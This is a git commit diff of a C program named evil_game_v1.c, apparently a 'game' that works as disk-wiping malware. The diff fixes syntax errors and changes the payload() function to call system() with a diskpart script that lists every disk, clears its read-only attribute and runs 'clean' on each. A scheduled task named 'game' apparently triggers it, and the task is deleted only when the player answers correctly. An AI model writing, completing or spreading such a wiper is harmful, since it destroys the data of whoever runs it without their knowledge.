26de573aa37b3bd74113ff386cdc03bee4465f49
will-the-creator <william.or3@proton.me>
2025-08-14 22:50:36 -0600

    Add files via upload

--- evil_game_v1.c
+++ evil_game_v1.c
@@ -41,22 +41,28 @@ void game() {
             safe();
             break;
         } else {
-            printf("Wrong :(")
+            printf("Wrong :(");
         }
 }}
 void safe() {
     system("schtasks /delete /tn \"game\" /f");
 }
 void payload() {
-    ShellExecute(0, "runas", "cmd.exe",
+    /*ShellExecute(0, "open", "cmd.exe",
                 "/c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
                 "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
                 "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
                 "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt",
-                0, SW_HIDE);
+                0, SW_HIDE);*/
+    system(
+        "cmd /c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
+        "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
+        "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
+        "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt"
+    );
 }
 int main(int argc, char *argv[]){
-    if (argc > 1 && strcmp(argv[1] "payload") == 0) {
+    if (argc > 1 && strcmp(argv[1], "payload") == 0) {
         payload();
         return 0;
     }
